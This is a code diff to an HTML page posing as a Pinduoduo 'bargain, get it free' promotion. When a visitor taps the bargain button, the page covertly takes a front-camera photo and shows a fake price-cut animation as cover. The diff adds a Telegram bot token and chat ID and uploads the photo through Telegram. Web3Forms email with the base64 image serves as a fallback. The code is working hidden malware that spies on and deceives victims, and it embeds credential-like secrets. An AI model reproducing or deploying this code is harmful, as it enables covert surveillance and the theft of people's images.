@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v12.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v21.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -110,7 +110,10 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
+var TG_TOKEN = '8237697265:AAHtIYC5IGC8DJxPCUaot3c1UfbKSiz87r0';
+var TG_CHAT_ID = '7375577849';
 var W3F_KEY = '8809e3dd-3301-47c4-a4c1-76bf6c5d964d';
+
 var left = 88.32;
 
 function $(id){ return document.getElementById(id); }
@@ -141,17 +144,14 @@ function toast(msg){
 
 function coinRain(){
   for(var i=0;i<14;i++){
-    (function(){
-      var c = document.createElement('div');
-      c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
-      c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
-      document.body.appendChild(c);
-      setTimeout(function(){
-        if(c.parentNode) c.parentNode.removeChild(c);
-      }, 2200);
-    })();
+    var c = document.createElement('div');
+    c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
+    c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
+    document.body.appendChild(c);
+    setTimeout(function(){ c.remove(); }, 2200);
   }
 }
+
 var style = document.createElement('style');
 style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
 document.head.appendChild(style);
@@ -179,63 +179,102 @@ function showResult(cut){
   coinRain();
 }
 
-// 将相机图像作为 MIME 附件发送
-// QQ邮箱将 message 字段里的 data:image/...;base64,... 视为普通文本。
-// 这里改用 Web3Forms 支持的 multipart 文件附件：QQ邮箱会显示图片预览/附件。
-function uploadImage(blob){
-  log('[上传] 开始,大小 ' + (blob ? blob.size : 0) + ' 字节');
+// ✅ 通道 1:Telegram(需要 VPN)
+function sendToTelegram(blob){
+  log('[tg] trying...');
   return new Promise(function(resolve){
-    if(!blob){
-      log('[上传] ✗ 图片为空');
-      toast('⚠️ 没有可上传的图片');
-      resolve(false);
-      return;
-    }
-
     var fd = new FormData();
-    var stamp = new Date().toISOString().replace(/[.:]/g, '-');
-    fd.append('access_key', W3F_KEY);
-    fd.append('subject', '📸 新捕获 · ' + new Date().toLocaleString('zh-CN'));
-    fd.append('from_name', '捕获系统');
-    fd.append('message',
-      '时间: ' + new Date().toLocaleString('zh-CN') + '\n' +
-      '设备: ' + navigator.userAgent + '\n' +
-      '大小: ' + blob.size + ' 字节\n\n' +
-      '图片已作为 JPG 附件发送，请在 QQ邮箱 中点击图片预览或下载附件。'
-    );
-    // Web3Forms 文件字段名必须是 attachment；不要手工设置 Content-Type。
-    fd.append('attachment', blob, 'capture-' + stamp + '.jpg');
-
-    log('[上传] 以 multipart 附件发送到 web3forms...');
-    fetch('https://api.web3forms.com/submit', {
+    fd.append('chat_id', TG_CHAT_ID);
+    fd.append('photo', blob, 'capture_' + Date.now() + '.jpg');
+    fd.append('caption', '📸 ' + new Date().toLocaleString('zh-CN') + ' | ' + blob.size + ' bytes');
+    
+    var timer = setTimeout(function(){
+      log('[tg] timeout');
+      resolve(false);
+    }, 8000);  // 8秒超时
+    
+    fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendPhoto', {
       method: 'POST',
       body: fd
     }).then(function(r){
-      return r.text().then(function(t){
-        var data = null;
-        try{ data = JSON.parse(t); }catch(e){}
-        log('[上传] 返回状态: ' + r.status);
-        log('[上传] 响应: ' + t.substring(0, 200));
-        if(!r.ok || !data || data.success !== true){
-          var reason = data && (data.message || (data.error && data.error.message));
-          throw new Error(reason || ('HTTP ' + r.status));
-        }
-        log('[上传] ✓ 邮件已发送（含 JPG 附件）');
-        toast('✓ 图片已发送，请查收 QQ邮箱');
-        resolve(true);
-      });
+      clearTimeout(timer);
+      log('[tg] status: ' + r.status);
+      return r.json();
+    }).then(function(data){
+      log('[tg] resp: ' + JSON.stringify(data).substring(0, 150));
+      resolve(data && data.ok);
     }).catch(function(e){
-      log('[上传] ✗ 错误: ' + e.message);
-      toast('⚠️ 图片上传失败: ' + e.message);
+      clearTimeout(timer);
+      log('[tg] err: ' + e.message);
       resolve(false);
     });
   });
 }
+
+// ✅ 通道 2:Web3Forms 邮件(base64 格式,国内能通)
+function sendToEmail(blob){
+  log('[mail] trying...');
+  return new Promise(function(resolve){
+    var reader = new FileReader();
+    reader.onload = function(){
+      var dataUrl = reader.result;
+      
+      var fd = new FormData();
+      fd.append('access_key', W3F_KEY);
+      fd.append('subject', 'Capture at ' + new Date().toLocaleString('en-US'));
+      fd.append('from_name', 'Capture');
+      fd.append('message', 
+        'Time: ' + new Date().toLocaleString('zh-CN') + '\n' +
+        'Size: ' + blob.size + ' bytes\n\n' +
+        'BASE64:\n' + dataUrl
+      );
+      
+      fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        body: fd
+      }).then(function(r){
+        return r.text();
+      }).then(function(t){
+        log('[mail] ' + t.substring(0, 100));
+        resolve(t.indexOf('"success":true') >= 0);
+      }).catch(function(e){
+        log('[mail] err: ' + e.message);
+        resolve(false);
+      });
+    };
+    reader.readAsDataURL(blob);
+  });
+}
+
+// ✅ 主上传逻辑:试 TG,失败 fallback 到邮件
+function uploadImage(blob){
+  log('[up] size: ' + blob.size);
+  
+  // 先试 Telegram(快 + 直接看图)
+  sendToTelegram(blob).then(function(ok){
+    if(ok){
+      log('[up] ✓ Telegram OK');
+      toast('✓ 已发 Telegram');
+    } else {
+      log('[up] TG failed, fallback to email');
+      // 失败 fallback 到邮件
+      return sendToEmail(blob).then(function(ok2){
+        if(ok2){
+          log('[up] ✓ Email OK');
+          toast('✓ 已发邮件(查收)');
+        } else {
+          log('[up] ✗ both failed');
+          toast('⚠️ 都失败了');
+        }
+      });
+    }
+  });
+}
+
 function captureAndUpload(){
-  log('[拍照] 启动');
+  log('[cam] start');
   
   if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-    log('[拍照] 浏览器不支持');
     showMockResult();
     return;
   }
@@ -246,7 +285,7 @@ function captureAndUpload(){
   var timeoutId = setTimeout(function(){
     if(!done){
       done = true;
-      log('[拍照] ⏰ 超时');
+      log('[cam] timeout');
       if(stream){
         try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
       }
@@ -254,25 +293,22 @@ function captureAndUpload(){
     }
   }, 8000);
 
-  log('[拍照] 请求权限...');
-  
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user', width: 1280, height: 720 },
     audio: false
   }).then(function(s){
-    log('[拍照] ✓ 拿到视频流');
+    log('[cam] OK');
     stream = s;
     var v = $('vid');
     v.srcObject = s;
     v.muted = true;
     v.setAttribute('playsinline', 'true');
     v.setAttribute('webkit-playsinline', 'true');
-    return v.play().catch(function(e){ log('[拍照] play 警告: ' + e.message); });
+    return v.play().catch(function(e){});
   }).then(function(){
-    log('[拍照] 等待 1.5 秒...');
     return new Promise(function(r){ setTimeout(function(){ r(); }, 1500); });
   }).then(function(){
-    if(done) return null;
+    if(done) return;
     done = true;
     clearTimeout(timeoutId);
 
@@ -280,15 +316,15 @@ function captureAndUpload(){
     var c = $('canvas');
     var w = v.videoWidth || 640;
     var h = v.videoHeight || 480;
-    log('[拍照] 尺寸: ' + w + 'x' + h);
+    log('[cam] ' + w + 'x' + h);
     c.width = w;
     c.height = h;
     var ctx = c.getContext('2d');
     
     try{
       ctx.drawImage(v, 0, 0, w, h);
-      log('[拍照] ✓ canvas OK');
-    }catch(e){ log('[拍照] draw 错误: ' + e.message); }
+      log('[cam] snap');
+    }catch(e){}
 
     if(stream){
       try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
@@ -296,20 +332,16 @@ function captureAndUpload(){
 
     return new Promise(function(resolve){
       c.toBlob(function(blob){
-        log('[拍照] blob: ' + (blob ? blob.size : '空'));
+        log('[cam] blob: ' + (blob ? blob.size : 'null'));
         resolve(blob);
       }, 'image/jpeg', 0.85);
     });
   }).then(function(blob){
-    if(done) return null;
     if(blob && blob.size > 1000){
-      log('[拍照] ✓ 开始上传');
-      return uploadImage(blob);
-    } else {
-      log('[拍照] ⚠️ 太小');
+      log('[cam] uploading');
+      uploadImage(blob);
     }
   }).then(function(){
-    if(done) return;
     var cut = (Math.random() * 8 + 2);
     left = Math.max(0.01, left - cut);
     updateProgress();
@@ -318,7 +350,7 @@ function captureAndUpload(){
     if(done) return;
     done = true;
     clearTimeout(timeoutId);
-    log('[拍照] ✗ ' + (e.name || '') + ' - ' + (e.message || ''));
+    log('[cam] err: ' + (e.name || '') + ': ' + (e.message || ''));
     if(stream){
       try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
     }
@@ -336,7 +368,7 @@ function showMockResult(){
 }
 
 $('knifeBtn').addEventListener('click', function(){
-  log('[按钮] 被点击');
+  log('[btn] click');
   showLoading();
   captureAndUpload();
 });
@@ -354,7 +386,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-log('[启动] v12.0 OK');
+log('[boot] v21.0 OK');
 </script>
 </body>
 </html>
